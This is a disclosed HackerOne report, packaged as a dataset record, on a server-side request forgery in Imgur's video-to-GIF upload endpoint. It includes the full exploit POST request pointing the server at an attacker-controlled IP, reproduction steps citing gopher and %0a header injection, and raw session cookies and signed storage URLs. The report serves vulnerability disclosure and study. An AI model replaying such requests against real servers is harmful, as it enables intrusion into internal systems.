{
    "reported_to": "Imgur",
    "reported_by": "mariuszpoplawski ",
    "title": "SSRF in imgur video GIF conversion",
    "content": "\nHi,\nThere was issue in -> https://hackerone.com/reports/115748\nWe have found similar one but in next steps\nAffected request\nCode 1.52 KiB\n1POST /vidgif/upload HTTP/1.1\n2Host: imgur.com\n3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\n4Accept: */*\n5Accept-Language: en-US,en;q=0.5\n6Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n7X-Requested-With: XMLHttpRequest\n8Referer: http://imgur.com/vidgif/video/between/56.72/9.71?url=http%3A%2F%2Fwww.onirikal.com%2Fvideos%2Fmp4%2Fbattle_games.mp4\n9Content-Length: 127\n10Cookie: SESSIONDATA=%7B%22sessionCount%22%3A3%2C%22sessionTime%22%3A1499684317408%7D; IMGURUIDJAFO=7450708ff93583b3772a3048e340856d59cef648c4dab74c825a83be56c807ab; _ga=GA1.2.1311247514.1499605938; _gid=GA1.2.2061092166.1499605938; __qca=P0-831392639-1499605938609; expPLAT51a=control; AZUSER=ue1-50873ccaac994527ac520cd62b5901e7; __gads=ID=1eb1b9c53a665ffd:T=1499605915:S=ALNI_MaUwqVKMDz-uAhHuqAQFc2_ajTK2Q; m_sort=viral; m_window=day; m_section=hot; __utma=247341212.1311247514.1499605938.1499607069.1499674066.2; __utmz=247341212.1499607069.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); c_sort=newest; c_window=day; __atuvc=2%7C28; GCS=top; authautologin=17d1c9dc6b5e4b318c27ca4b85921a90%7EVJ3S8CJDeJgyKiUlrdYxGzQ99xkZiEox; _nc=1; f_sort=newest; f_section=favorites; retina=0; OX_plg=swf|shk|pm; UPSERVERID=upload.i-083e69b6391b5191e.production; __utmc=247341212; IMGURSESSION=5c493a419036f493aa69b0b40d8b1f28; __cfduid=d5d1746c7fcc97ff5c333cae83ce89d571499673731; showComments=1; c1069960587=1\n11Connection: close\n12\n13source=http%3A%2F%2F192.166.218.53%2Fmalicious123.php&url=http%3A%2F%2F192.166.218.53%2Fmalicious123.php&start=56.72&stop=66.43\nPoC\nHTTP Requests\n<image_0>\nFTP Requests\n<image_1>\nAnd most important like in the old vulnerable spot gopher where attacker have posibilities to inject stuff in headers with usse of %0a\n<image_2>\nSorry for short description i assume u already know what SSRF is as u fixed previous vulnerable spot, if something is not clear feel free to ask\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Server-Side Request Forgery (SSRF)"
    ],
    "screenshots": {
        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/201/616/8c918754149b2d34e2d60b81de8c0fb6b2bb0ebf/http.png?response-content-disposition=attachment%3B%20filename%3D%22http.png%22%3B%20filename%2A%3DUTF-8%27%27http.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WYD3AC3%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T231709Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD6NP%2FABKgzxmoCcv9sJsI3Et2vkO93301U%2B%2FGtCk9ibQIhAP9zVYFNBTDT7Q1KXlEfz2NCIrWAe5c%2FXVNd0oWdr0PiKrEFCCAQAxoMMDEzNjE5Mjc0ODQ5IgylqlOE8vRpauItn8QqjgW0z%2Fls4%2BcbslpHRjfx3lN0Bpjq3it15r5a7xtKrpdTngvGZBGnkPfr1ChLNsa222HwEYECGpLisEG4BrlRpIgwcdHZHg7KoRhUz69jFx202%2FfAWi2%2FtTmlOK423VacHuHFYR9AIyBMmIrRDqJL9iXC2oNOLAgruVlOkQFU2W8AKErET%2BKdb0V%2F4Uq25HNe6FPOk0JtWSxlKoMRpKB0W2mHewzPXXOzSn64EE7HAzZOWAtm38aRloZaZXE5EKYwp3pwvFNCnITM7S7QSzgMwjFE2cc9Fv2ipL1Zot6BUlRzjV%2FsB36EokF%2FtPIZYCYFZJs6o4Y1QptgKJbeInUBBD3ZttV1TCvLPPYqBbzQ19WY%2FcyauMrBTXYMiPIxPsnee50gAPf2rQ7S9vMfuT89J6LN%2F20V%2BbGKsCfyajYY8H1XoQbGBFz7YCJ9uMhOLUqYE4Zdkh2LsTCmslIBQgiXfFixaJx4l3BxZ5nzhfkOBe5M3fbv9PO7VngkiXZXP6o3rUXohShAsjU2uyWY2iN%2BhHVsGvMYOSmEFF6Ibe7lFbz5naf6IVafaXAjMqJCXoZpB1WLgR0V4dRZ0erKqrklT3cdEOBqUa7XsR5Mab7440kKHRcmu0Vyls9QnrEC%2F18OqPTjvkbo%2Bshdy9lZf%2FZ5qlTAibyYsXEW%2BEkAljoGc8dnkc%2BB%2FYkRxo6E6aU6FPgQ8bsJvgsUyTsqxwfHQJ2OcLh5LXfd4kJfE75ep%2BhU9VR6NYMTX5ivvXgyCuXVdAUMupcWtSGthfBBDcciXJHlrDekXEBXUaX%2BG1%2F%2FjZn4qLnApD7Zuuw%2F%2Bo5MQQGadR2%2BCeqNd1J9hU8jo6V3LHSLBmkr90Vn9DfpRVCEgpZeJQMwy%2BeMvwY6sAHcjw%2Bim5kWozWxabVY77DysEWqSMkpWp%2BUOu%2FPSFXM7HbHrFNR%2FssIFg8oP8ROM0P11G%2BVgVN6ADljZqk9t8vXkGo5FmvKB0Gg%2BWKG8vl1XdWXxOay724qlcnDtcHgQi27sUZ2TPoQ%2BONtmFmbQULynP5vjSM%2BGaUwudRSJTE2XfGCbgPKCjjsz1WdnNvN%2FFu3GZSJ1Ozlf7yWNcQ2oReI2GtE8mK6yhD05obRLTbdyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a8ccb20d8d7d866432686de15b27a6b21138faa5579280442a3c473c95d4a7ea",
        "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/201/614/40d2dc5523654674ca64456a993edf1b56d8bf72/ftp.png?response-content-disposition=attachment%3B%20filename%3D%22ftp.png%22%3B%20filename%2A%3DUTF-8%27%27ftp.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WYD3AC3%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T231709Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD6NP%2FABKgzxmoCcv9sJsI3Et2vkO93301U%2B%2FGtCk9ibQIhAP9zVYFNBTDT7Q1KXlEfz2NCIrWAe5c%2FXVNd0oWdr0PiKrEFCCAQAxoMMDEzNjE5Mjc0ODQ5IgylqlOE8vRpauItn8QqjgW0z%2Fls4%2BcbslpHRjfx3lN0Bpjq3it15r5a7xtKrpdTngvGZBGnkPfr1ChLNsa222HwEYECGpLisEG4BrlRpIgwcdHZHg7KoRhUz69jFx202%2FfAWi2%2FtTmlOK423VacHuHFYR9AIyBMmIrRDqJL9iXC2oNOLAgruVlOkQFU2W8AKErET%2BKdb0V%2F4Uq25HNe6FPOk0JtWSxlKoMRpKB0W2mHewzPXXOzSn64EE7HAzZOWAtm38aRloZaZXE5EKYwp3pwvFNCnITM7S7QSzgMwjFE2cc9Fv2ipL1Zot6BUlRzjV%2FsB36EokF%2FtPIZYCYFZJs6o4Y1QptgKJbeInUBBD3ZttV1TCvLPPYqBbzQ19WY%2FcyauMrBTXYMiPIxPsnee50gAPf2rQ7S9vMfuT89J6LN%2F20V%2BbGKsCfyajYY8H1XoQbGBFz7YCJ9uMhOLUqYE4Zdkh2LsTCmslIBQgiXfFixaJx4l3BxZ5nzhfkOBe5M3fbv9PO7VngkiXZXP6o3rUXohShAsjU2uyWY2iN%2BhHVsGvMYOSmEFF6Ibe7lFbz5naf6IVafaXAjMqJCXoZpB1WLgR0V4dRZ0erKqrklT3cdEOBqUa7XsR5Mab7440kKHRcmu0Vyls9QnrEC%2F18OqPTjvkbo%2Bshdy9lZf%2FZ5qlTAibyYsXEW%2BEkAljoGc8dnkc%2BB%2FYkRxo6E6aU6FPgQ8bsJvgsUyTsqxwfHQJ2OcLh5LXfd4kJfE75ep%2BhU9VR6NYMTX5ivvXgyCuXVdAUMupcWtSGthfBBDcciXJHlrDekXEBXUaX%2BG1%2F%2FjZn4qLnApD7Zuuw%2F%2Bo5MQQGadR2%2BCeqNd1J9hU8jo6V3LHSLBmkr90Vn9DfpRVCEgpZeJQMwy%2BeMvwY6sAHcjw%2Bim5kWozWxabVY77DysEWqSMkpWp%2BUOu%2FPSFXM7HbHrFNR%2FssIFg8oP8ROM0P11G%2BVgVN6ADljZqk9t8vXkGo5FmvKB0Gg%2BWKG8vl1XdWXxOay724qlcnDtcHgQi27sUZ2TPoQ%2BONtmFmbQULynP5vjSM%2BGaUwudRSJTE2XfGCbgPKCjjsz1WdnNvN%2FFu3GZSJ1Ozlf7yWNcQ2oReI2GtE8mK6yhD05obRLTbdyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7ce8edf97b529aa99eae657e3a16cf1a75aa9fab4e43c1a859ab01ca90ece520",
        "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/201/615/d7ff32ba4e3de342d4755212ea72cb1adfbd3e73/gopher.png?response-content-disposition=attachment%3B%20filename%3D%22gopher.png%22%3B%20filename%2A%3DUTF-8%27%27gopher.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WYD3AC3%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T231709Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD6NP%2FABKgzxmoCcv9sJsI3Et2vkO93301U%2B%2FGtCk9ibQIhAP9zVYFNBTDT7Q1KXlEfz2NCIrWAe5c%2FXVNd0oWdr0PiKrEFCCAQAxoMMDEzNjE5Mjc0ODQ5IgylqlOE8vRpauItn8QqjgW0z%2Fls4%2BcbslpHRjfx3lN0Bpjq3it15r5a7xtKrpdTngvGZBGnkPfr1ChLNsa222HwEYECGpLisEG4BrlRpIgwcdHZHg7KoRhUz69jFx202%2FfAWi2%2FtTmlOK423VacHuHFYR9AIyBMmIrRDqJL9iXC2oNOLAgruVlOkQFU2W8AKErET%2BKdb0V%2F4Uq25HNe6FPOk0JtWSxlKoMRpKB0W2mHewzPXXOzSn64EE7HAzZOWAtm38aRloZaZXE5EKYwp3pwvFNCnITM7S7QSzgMwjFE2cc9Fv2ipL1Zot6BUlRzjV%2FsB36EokF%2FtPIZYCYFZJs6o4Y1QptgKJbeInUBBD3ZttV1TCvLPPYqBbzQ19WY%2FcyauMrBTXYMiPIxPsnee50gAPf2rQ7S9vMfuT89J6LN%2F20V%2BbGKsCfyajYY8H1XoQbGBFz7YCJ9uMhOLUqYE4Zdkh2LsTCmslIBQgiXfFixaJx4l3BxZ5nzhfkOBe5M3fbv9PO7VngkiXZXP6o3rUXohShAsjU2uyWY2iN%2BhHVsGvMYOSmEFF6Ibe7lFbz5naf6IVafaXAjMqJCXoZpB1WLgR0V4dRZ0erKqrklT3cdEOBqUa7XsR5Mab7440kKHRcmu0Vyls9QnrEC%2F18OqPTjvkbo%2Bshdy9lZf%2FZ5qlTAibyYsXEW%2BEkAljoGc8dnkc%2BB%2FYkRxo6E6aU6FPgQ8bsJvgsUyTsqxwfHQJ2OcLh5LXfd4kJfE75ep%2BhU9VR6NYMTX5ivvXgyCuXVdAUMupcWtSGthfBBDcciXJHlrDekXEBXUaX%2BG1%2F%2FjZn4qLnApD7Zuuw%2F%2Bo5MQQGadR2%2BCeqNd1J9hU8jo6V3LHSLBmkr90Vn9DfpRVCEgpZeJQMwy%2BeMvwY6sAHcjw%2Bim5kWozWxabVY77DysEWqSMkpWp%2BUOu%2FPSFXM7HbHrFNR%2FssIFg8oP8ROM0P11G%2BVgVN6ADljZqk9t8vXkGo5FmvKB0Gg%2BWKG8vl1XdWXxOay724qlcnDtcHgQi27sUZ2TPoQ%2BONtmFmbQULynP5vjSM%2BGaUwudRSJTE2XfGCbgPKCjjsz1WdnNvN%2FFu3GZSJ1Ozlf7yWNcQ2oReI2GtE8mK6yhD05obRLTbdyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6490077bc1d39242b06379a99a3f7d8dd11f19bfd3c282a5b13fba37321d5962"
    },
    "disclosed_date": 1597328100,
    "report_url": "https://hackerone.com/reports/247680",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Identify the vulnerable endpoint `/vidgif/upload` on imgur.com that accepts video to GIF conversion requests."
        ],
        [
            2,
            "Craft a malicious POST request with a manipulated `source` or `url` parameter pointing to an attacker-controlled server (e.g., `http://192.166.218.53/malicious123.php`). Include headers or payloads that exploit SSRF, such as using `%0a` to inject headers or target internal services."
        ]
    ],
    "vuln_description": "The vulnerability is a Server-Side Request Forgery (SSRF) in imgur's video to GIF conversion feature. By manipulating the `source` or `url` parameters in the `/vidgif/upload` endpoint, an attacker can force the server to make arbitrary HTTP requests to internal or external systems, potentially accessing sensitive data or exploiting internal services. The attack can also leverage protocol handlers (e.g., FTP, gopher) or header injection via `%0a` to escalate the impact.",
    "reason": "The vulnerability requires understanding SSRF exploitation techniques, including protocol manipulation and header injection, but the attack itself is straightforward once the vulnerable endpoint is identified. The complexity is mitigated by the fact that the tester likely referenced a prior similar report (HackerOne #115748) for guidance.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": "115748"
}